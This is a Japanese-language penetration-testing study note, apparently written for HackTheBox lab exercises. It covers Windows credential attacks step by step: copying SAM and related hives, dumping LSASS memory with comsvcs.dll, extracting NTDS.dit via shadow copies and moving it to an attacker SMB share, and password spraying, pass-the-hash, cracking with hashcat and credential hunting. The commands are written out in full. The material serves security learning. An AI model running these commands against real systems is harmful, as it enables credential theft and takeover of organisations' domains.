---
{"dg-publish":true,"permalink":"/pentest-technique/windows-local-password-attack/"}
---

要は、パスワードハッシュを取得して、クラックして、認証情報を取得しようという試み
[[セキュリティ用語/Windows 基礎\|Windows 基礎]]の認証プロセスに結構書いてあるから、一回読んどくと良さそう

ローカルパスワード攻撃のいいところ
- SAMデータベースに関連付けられたファイルをすばやくダンプして攻撃ホストに転送し、オフラインでハッシュのクラックを開始することができる
	- オフラインで行うと、ターゲットとのアクティブなセッションを維持せずに、攻撃を行うことができる
Windows認証の簡単な図
詳しくは[[セキュリティ用語/Windows 基礎\|Windows 基礎]]

![](https://i.imgur.com/ftpLwuq.png)


# SAMへの攻撃
## 概要
- [[セキュリティ用語/Windows 基礎\|Windows 基礎]]のSAMの見出しを見て

ターゲットにローカル管理者アクセス権がある場合、コピーできるレジストリハイブが3つある
ハッシュをダンプしてクラックするときは、それぞれが特定の目的を持つ

| **レジストリハイブ**    | **含まれる情報**                                                                               | **攻撃者ができること（具体例）**                                                                                                                                  |
| --------------- | ---------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | ローカルアカウントのハッシュ（Windowsのローカルユーザーのパスワードハッシュ）<br>このsamは、SAMデータベースの意味samで、ユーザー名がsamというわけではない | - ハッシュをクラックすることで、他のシステム・ユーザーへ横展開<br>- 得たクレデンシャルを使ってRDPやSMB経由でシステムにアクセス                                                                              |
| `hklm\system`   | **SAMデータベースの暗号化に使用されるブートキー**                                                             | - ハッシュを抜き出し、権限昇格（Privilege Escalation）や横展開（Lateral Movement）に利用<br>- LSA Secrets の復号に使用し、保存されているクレデンシャルを取得                                          |
| `hklm\security` | **ドメインアカウントのキャッシュされた資格情報（NL$KM）**                                                        | -キャッシュされたドメインログオン情報をダンプし、ハッシュやパスワードを取得（mimikatz, secretsdump.py など）<br>- ドメインに参加している場合、管理者クレデンシャルを取得できる可能性がある<br>- ドメイン環境での横展開（DCや他のサーバーへのアクセス）<br> |


## **reg.exeを使用してレジストリハイブをコピーする**
 - `reg.exe`を使用して、これらのバックアップを作成できる
- 管理者としてCMDを起動すると、reg.exeを実行して、前述のレジストリハイブのコピーを保存できる
```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```
- 技術的には`hklm\sam`と`hklm\system`のみが必要
- `hklm\security`は、ドメインに参加しているマシンでは、キャッシュされたドメインユーザーアカウントのハッシュが含まれている可能性があるから保存しておくと役に立つことがあるかも


## **ファイル転送**
以下のいずれかの例を使用して、ファイルを転送する
[[Pentest_Technique/File Transfer\|File Transfer]]の「LinuxでSMBサーバーを建てる」が一番ベスト
- Base64とかでやろうとしてもサイズが大きすぎて逆に大変


## **Impacketのsecretsdump.pyでハッシュをダンプする**
- secretsdump.pyがどこにあるかを調べる
```
locate secretsdump.py
```

- Pythonを使用してsecretsdump.pyを実行し、ターゲットホストから取得した各hiveファイルを指定して実行するだけ
```shell-session
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
- secretsdumpはローカルのSAMハッシュをダンプする
	- もしターゲットがドメインに参加していて、hklm\securityにキャッシュされた認証情報があれば、それもダンプされていただろう。
-  secretsdumpが最初に実行するのは、システムのブートキーを取得する
	- その後、ローカルのSAMハッシュをダンプする
- SAMデータベースのハッシュは、ブートキーがなければ取得できない
	- ブートキーはSAMデータベースの暗号化と復号化に使用されるため、事前にレジストリハイブのコピーを取得しておくことが重要

secretsdump.pyの出力の上部に注目する
- ハッシュがNTハッシュなのか、LMハッシュなのかを教えてくれる
	- NTハッシュ
		- 最新のWindowsオペレーティングシステムのほとんどは、パスワードをNTハッシュとして保存する
	- LMハッシュ
		- Windows Vista および Windows Server 2008 より古いオペレーティングシステムは、パスワードを LM ハッシュとして保存する
- ハッシュの種類を知ることで、各ユーザーアカウントに関連付けられたNTハッシュをテキストファイルにコピーして、パスワードの解読を開始できる


### **ダンプされたハッシュの見方**
- `Administrator`, `Guest`, `DefaultAccount` のような **デフォルトアカウント** のNTLMハッシュは **`31d6cfe0d16ae931b73c59d7e0c089c0`** になっている
	- `31d6cfe0d16ae931b73c59d7e0c089c0`は、空のパスワードを指す
	- ハッシュをクラックする意味がない
- どこの部分をHashcatでクラックすればいいのか
	- ダンプされたものの構造
```sh
ユーザー名:RID:LMハッシュ:NTハッシュ:::
```
例
`bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::`

| **フィールド** | **値**                              | **説明**                                                 |
| --------- | ---------------------------------- | ------------------------------------------------------ |
| ユーザー名     | `bob`                              | Windowsのユーザー名                                          |
| RID       | `1001`                             | 相対識別子（Relative Identifier）。Windowsの各ユーザーに割り当てられる一意のID  |
| LMハッシュ    | `aad3b435b51404eeaad3b435b51404ee` | LAN Manager（LM）ハッシュ。通常、新しいWindowsでは無効化されており、常にこの固定値になる |
| NTハッシュ    | `64f12cddaa88057e06a81b54e73b949b` | NTLM（NT）ハッシュ。Windowsパスワードのハッシュ化形式で、攻撃者がクラックを試みる部分      |
| その他       | `:::`                              | 予備フィールド（歴史的な名残で存在するが通常は空）                              |
NTハッシュの部分をまとめて`hashestocrack.txt`として、保存する
```shell-session
snowyowl644@htb[/htb]$ sudo nano hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```


## **Hashcatでハッシュをクラックする**
- .txtに、Impacketのsecretsdump.pyで分かったハッシュを一行ずつ書く
- Hashcatのハッシュタイプと関連する番号を確認する
	- https://hashcat.net/wiki/doku.php?id=example_hashes
- NTハッシュは、ハッシュタイプは1000
- rockyou.txtだとこんな感じ
```shell-session
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

## リモートでのSAM・LSA攻撃
- ローカルで管理者権限を持つアカウントだと、ネットワーク上で、LSA認証情報もターゲットにすることができる
- リモートで取得できた次は、Hashcatでクラックする

LSAシークレットをリモートでダンプする
```shell-session
crackmapexec smb <ターゲットIP> --local-auth -u <ユーザー名> -p <パスワード> --lsa
```


このコマンドは、SMBを使ってターゲットのLSA Secretsを取得し、システム上に保存されている認証情報をダンプする目的で使用されます。
SAMをリモートでダンプする
```shell-session
crackmapexec smb <ターゲットIP> --local-auth -u <ユーザー名> -p <パスワード> --sam
```

# LSASSへの攻撃
## 概要
- LSASS.exe :（Local Security Authority Subsystem Service）
- ユーザーの認証を行うために、使うプロセス(.exe)のこと
- LSASS.exeはWindowsのセキュリティを司るプロセスで、さまざまな認証パッケージ（NTLMやKerberosなど）を呼び出して認証処理を実行する
- LSASS.exeでログインしたときの、メモリをダンプして、資格情報を抽出する

## **メモリダンプの作成方法**
タスクマネージャからメモリダンプを作成できる方法
「タスクマネージャーを開く」 > 「プロセスタブを選択」 > 「Local Security Authority Process を見つけて右クリック」 > 「ダンプファイルを作成を選択」
すると、`C:\Users\loggedonusersdirectory\AppData\Local\Temp`に`lsass.DMP`というファイルが作られるので、攻撃元に送って、ハッシュをクラックする

**Rundll32.exe & Comsvcs.dll メソッド**
- 最新のウイルス対策ツールは、この方法を悪意のある活動として認識する
- ダンプファイルを作成するコマンドを発行する前に、`lsass.exe`に割り当てられるプロセスID（`PID`）を調べる必要がある
CMD
```cmd-session
C:\Windows\system32> tasklist /svc
```
PowerShell
```powershell-session
PS C:\Windows\system32> Get-Process lsass
```

 LSASSプロセスにPIDを割り当てたら、ダンプファイルを作成できる
 - `rundll32.exe`を実行して`comsvcs.dll`のエクスポートされた関数を呼び出す
	 - MiniDumpWriteDump（`MiniDump`）関数も呼び出して、LSASSプロセスメモリを指定されたディレクトリ（`C:\lsass.dmp`）にダンプする
	 - 最新のAVツールのほとんどは、これを悪意のあるものとして認識し、コマンドの実行を防止しちゃう
		 - 直面しているAVツールをバイパスまたは無効にする方法を検討する必要がある
PowerShell
```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
ダンプできたファイルは、攻撃元に送っておく

## **ファイル転送**
以下のいずれかの例を使用して、ファイルを転送する
[[Pentest_Technique/File Transfer\|File Transfer]]の「LinuxでSMBサーバーを建てる」が一番ベスト
- Base64とかでやろうとしてもサイズが大きすぎて逆に大変

## **Pypykatzを使用して資格情報を抽出する**
- [pypykatz](https://github.com/skelsec/pypykatz)と呼ばれる強力なツールを使用して、.dmpファイルから資格情報を抽出することがでる
	- Pypykatzは、完全にPythonで書かれたMimikatzの実装

攻撃元のKali
```sh
pip3 install pypykatz
```

```shell-session
pypykatz lsa minidump <ダンプしてきたファイル>
```

出力されるログの詳細な情報の確認
- **MSV**
	- Windowsの認証パッケージで、LSAがSAMデータベースと照合してログオン認証を行う。
	- pypykatzは、SID、ユーザー名、ドメイン、NT & SHA1のパスワードハッシュを抽出。

- **WDIGEST**
	- 古い認証プロトコルで、Windows XP ～ Windows 8、Windows Server 2003 ～ 2012 でデフォルト有効。
	- LSASSがWDIGESTの認証情報を平文でキャッシュするため、攻撃対象のシステムでWDIGESTが有効であれば、パスワードが平文で見える可能性がある。
	- 近年のWindowsではデフォルトで無効化されており、Microsoftはこの問題に対するセキュリティアップデートを提供。

- **Kerberos**
	- Active Directory環境で使用されるネットワーク認証プロトコル。
	- ドメインユーザーは認証時にチケットを取得し、これを使って共有リソースへアクセスできる。
	- LSASSは、パスワード、暗号キー、チケット、PINをキャッシュするため、メモリから抽出可能。

- **DPAPI**
	- Windowsのデータ保護APIで、ユーザーごとにデータを暗号化・復号する。
	- 以下のアプリケーションがDPAPIを使用
		- Internet Explorer: 保存したサイトのユーザー名とパスワード
		- Google Chrome: 保存したサイトのユーザー名とパスワード
		- Outlook: メールアカウントのパスワード
		- リモートデスクトップ接続: 保存された接続用資格情報
		- 資格情報マネージャー: 共有リソース、Wi-Fi、VPNなどの資格情報
- MimikatzやPypykatzは、ログオンユーザーのDPAPIマスターキーを抽出し、それを用いて各アプリの認証情報を復号できる。

みつかったNTハッシュをHashCatでクラックすればできる
- ハッシュが一つの場合は、リストにしないでそのまま貼って大丈夫だって。
```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```


# Active DirectoryとNTDS.ditへの攻撃
## 概要
- `Active Directory`（`AD`）は、現代の企業ネットワークで一般的で重要なディレクトリサービス
- 組織がWindowsを使用している場合、そのWindowsシステムの管理にはADが使われていると考えて間違いない
- ADと言えども、ターゲットにネットワーク越しにアクセス可能であることが前提となる
	- 初期侵入が成功し、内部ネットワーク上に足がかりを確保した後の手順をシミュレーションしている

Windowsシステムがドメインに参加した際の認証プロセス
- ドメインに参加したWindows端末の挙動
    - ログオン時の認証は、デフォルトで **SAMデータベース** ではなく **ドメインコントローラー** に送られる
    - ただし、SAMデータベースを完全に使えなくなるわけではない
- SAMデータベースを使ってローカルアカウントでログオンする方法
	- ホスト名を指定してログオン
		- 例: `WS01\ユーザー名`
	- ログオンUIで `./` を使う
		- 例: `./ユーザー名`

## CrackMapExecを使用したADアカウントへの辞書攻撃

辞書攻撃を行う際の懸念
- 辞書攻撃をネットワーク経由で実行すると、多くのトラフィックを発生させるため 検出されやすい（ノイズが多い）
- グループポリシー（Group Policy）でログイン試行の回数制限が設定されている場合、短時間でロックアウトされる可能性もあり

回避策
- 辞書攻撃を実行する際は、できるだけターゲットに合わせてカスタマイズ するのが有効。
### **ターゲットに応じたカスタマイズとユーザー名の特定**
辞書攻撃の成功率を高めるには、**ターゲット企業の情報を収集し、ユーザー名の命名規則を特定することが重要**。  
以下の手順で、より効果的なユーザー名リストを作成できる。

#### **1. 企業情報の収集**

- **公式Webサイトやソーシャルメディアを調査**
- **社員名簿が公開されていれば活用**
- **従業員の名前を取得**（特に新入社員）
    - 多くの企業は **一定の命名規則** に従ってユーザー名を作成している

#### **2. ユーザー名の命名規則を特定**

企業によっては、従業員のユーザー名に共通のルールがある。  
例えば、`Jane Jill Doe` という名前の従業員がいる場合、以下のような形式が考えられる。

|ユーザー名の形式|例|
|---|---|
|頭文字＋姓|`jdoe`|
|頭文字（名＋ミドル名）＋姓|`jjdoe`|
|フルネーム（名＋姓）|`janedoe`|
|名.姓|`jane.doe`|
|姓.名|`doe.jane`|
|ニックネーム|`doedoehacksstuff`|

#### **3. メールアドレスの構造を利用**

- 企業のメールアドレスは `username@domain` の形式になっていることが多い
- 例えば、`jdoe@inlanefreight.com` というメールが見つかれば、`jdoe` がユーザー名である可能性が高い

#### **4. 追加の情報収集テクニック（MrB3nのヒント）**

- **Google検索でドメイン名を調べる**
    - `”@inlanefreight.com”` を検索すると、有効なメールアドレスが見つかる可能性
- **ソーシャルメディアのスクレイピング**
    - 取得したメールアドレスや名前をもとに、スクリプトでユーザー名候補を自動生成
- **ユーザー名の難読化（オブスクエーション）に注意**
    - 企業によっては `joe.smith` を `a907` のようにエイリアス化して隠すこともある
- **Google Dorksを活用**
    - `inlanefreight.com filetype:pdf` で検索すると、**PDFの作成者情報** にユーザー名が含まれていることがある
- **スクリプトでユーザー名を自動生成**
    - 収集した情報をもとに命名規則を推測し、多数の候補を作成
    - これらの候補を使い、パスワードスプレー攻撃を実行

### **ユーザー名リストの自動生成**

ユーザー名リストは**手動で作成することも可能**だが、**自動生成ツールを活用**すれば効率的に一般的なユーザー名フォーマットを作成できる。

### 1. わかっているユーザーネームをファイルにまとめる
```shell-session
snowyowl644@htb[/htb]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```
#### **2. 自動リスト生成ツールを使用**
- **`Username Anarchy`**（Rubyベースのツール）を使用すると、**実名リストから複数のユーザー名パターンを生成可能**
- Gitを使って攻撃ホストにツールをクローンし、実際の名前リストに適用する

#### **3. `Username Anarchy` の利用方法**
1. **ツールをGitでクローン**
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```
3. **リストを使ってユーザー名を生成**
```bash
./username-anarchy -i ../usernames.txt 
```
→ 実際の名前リストを基に、**一般的なユーザー名形式を自動的に作成**

### CrackMapExecで攻撃を開始する
- ターゲットドメインコントローラーに対する攻撃
	- SMBプロトコルと組み合わせることもできる

例 : ユーザー(-u) bwilliamson に対して、パスワードリスト（-p） `/usr/share/wordlists/fasttrack.txt`に含まれる一般的なパスワードを試行
```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

ユーザー側もファイルを指定したい場合
```sh
crackmapexec smb 10.129.201.57 -u users.txt -p /usr/share/wordlists/fasttrack.txt
```
注意点: アカウントロックアウトのリスク
- 管理者がアカウントロックアウトポリシーを設定している場合、この攻撃によってターゲットアカウントがロックされる可能性がある
- 2022年1月時点 では、Windowsドメインに適用される デフォルトのグループポリシーではアカウントロックアウトポリシーは有効化されていない
- そのため、この攻撃に対して脆弱な環境に遭遇する可能性がある

## NTDS.ditのキャプチャ
- NT Directory Services (NTDS) 
	- AD（Active Directory）と共に利用されるディレクトリサービス
	- ネットワークリソースの検索と整理を行う
- NTDS.dit
	- ADに関連付けられた主要なデータベースファイル
		- すべてのドメインユーザー名、パスワードハッシュ、その他の重要なスキーマ情報が書いてある
	- フォレスト内のドメインコントローラー上の `%systemroot%/ntds` に保存
	- dit は「directory information tree（ディレクトリ情報ツリー）」の略
	- 入手できれば
		- SAM攻撃と同じ要領でドメイン上のすべてのアカウントを侵害できる可能性がある
- 取得に必要な権限
	- ローカル管理者（`Administrators group`）またはドメイン管理者（`Domain Admins group`）（または同等の）権限が必要

### Evil-WinRMでDCに接続
DC : Domain Contoroller
- Active Directory環境において認証やディレクトリサービスの提供など、重要な役割を担うサーバ
```shell-session
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

### ローカルグループメンバーシップの確認
ログインしたユーザーの権限と、ローカルグループのメンバーシップを調べる
- ローカルグループ
	- それぞれのワークステーションやサーバー内のユーザーグループのこと
		- ADには、ドメインユーザーグループもあるけど、ここでは、DC内のユーザーってこと
目的 : 権限昇格する必要性があるのか、横展開する必要があるのかを判断するための情報収集

アカウントにローカル管理者権限があるかどうかを確認
NTDS.ditファイルのコピーを作成するには、ローカル管理者（`Administrators group`）またはドメイン管理者（`Domain Admins group`）（または同等の）権限が必要
```shell-session
*Evil-WinRM* PS C:\> net localgroup
```

ドメインを含むユーザーアカウントの権限の確認
```shell-session
*Evil-WinRM* PS C:\> net user <ユーザー名>
```

### Cのシャドウコピーの作成
vssadminを使用して、Cドライブまたは管理者がADの初期インストール時に選択した任意のボリュームの[VSS](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)を作成する
- VSSは、PPやシステムを停止しないで、読み書きがアクティブなボリュームのコピーを作成できる
```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

### VSS から NTDS.dit をコピーして、攻撃元に転送する
C:の作成できたVSSから、NTDS.ditファイルだけを抽出する
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy <Shadow Copy Volume Name>\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

転送は、[[Pentest_Technique/File Transfer\|File Transfer]]の「LinuxでSMBサーバーを建てる」の方法で、攻撃元のLinuxを準備する

攻撃先のWindows用のコマンド
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\<攻撃元のIP>\CompData 
```


### CrackMapExecを使うことで自動化する
- 上記と同じ手順をすべて1つのコマンドでできる
- このコマンドを使用すると、VSSを利用して、ターミナルセッション内でNTDS.ditファイルの内容をすばやくキャプチャしてダンプする
- 攻撃元のホストで以下のコマンドを実行
```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### ハッシュのクラックとPass-The-Hashでのログイン
- ハッシュのクラックは、SAM攻撃、LSASS攻撃と同様の手法でできる

Pass-The-Hash
- ハッシュを使用して、`Pass-the-Hash`（`PtH`）と呼ばれるタイプの攻撃を使用してシステムで認証
- PtH 攻撃は、[NTLM 認証プロトコル](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials)を利用して、パスワード ハッシュを使用してユーザーを認証する
	- ログインの形式として`username`:`clear-text password`の代わりに、`username`:`password hash`を使用できる

コマンド
```shell-session
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

ターゲットへの初期侵入後、ネットワーク内で横展開を行う必要がある場合に、Pass-The-Hashを試みることができる

# Windowsでの資格情報ハンティング(Credential Hunting)
- `Credential Hunting`は、ファイルシステム全体とさまざまなアプリケーションを通じて詳細な検索を実行してクレデンシャルを発見するプロセス

## 検索
- ユーザがシステムのどこかにパスワードを文書化している可能性がある
- デフォルトの資格情報の中でさまざまなファイルを見つけることができる

IT 管理者は日常的に何をしていますか？資格情報が必要なタスクはどれですか？
と考えて、検索するのが大事

#### 検索する主な用語
- Passwords
- Passphrases
- Keys
- Username
- User account
- Creds
- Users
- Passkeys
- Passphrases
- configuration
- dbcredential
- dbpassword
- pwd	Login
- Credentials

- [Lazagne](https://github.com/AlessandroZ/LaZagne)などのサードパーティのツールの利用
	- Webブラウザやその他のインストールされたアプリケーションが安全に保存できない可能性のある資格情報をすばやく発見することもできる
	- 攻撃元のサーバーから転送する必要がある
 
 lazagneが持つすべてのモジュールが実行される
```cmd-session
C:\Users\bob\Desktop> start lazagne.exe all -vv
```

- [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)を使用して、多くの種類のファイルのパターンから検索することもできる
```cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```


- 追加の考慮事項
    - Windows環境で認証情報を探索するために利用できるツールやキーワードは数千種類存在する
    - 使用するツールや手法は、主に対象のコンピューターの役割に基づいて選択される
        - Windows Server OSの場合と、Windows Desktop OSの場合ではアプローチが異なる
    - システムの利用状況に常に留意することで、どこを探索すべきかが判断しやすくなる
    - ツールが動作している間に、ファイルシステム上のディレクトリをナビゲートおよび一覧表示することで、認証情報を発見できる場合もある
- 認証情報探索時に留意すべきその他の場所
    - SYSVOL共有フォルダ内のグループポリシーに含まれるパスワード
    - SYSVOL共有フォルダ内のスクリプトに含まれるパスワード
    - IT共有フォルダ上のスクリプトに含まれるパスワード
    - 開発用マシンやIT共有フォルダ上のweb.configファイル内のパスワード
    - **unattend.xml**
    - ADユーザーまたはコンピュータの説明フィールド内のパスワード
    - KeePassデータベース
        - ハッシュを抽出し、クラッキングすることで多数のアクセス権を獲得可能
    - ユーザーシステムや共有フォルダ上で見つかるファイル
        - 例：pass.txt、passwords.docx、passwords.xlsx、SharePoint上のファイル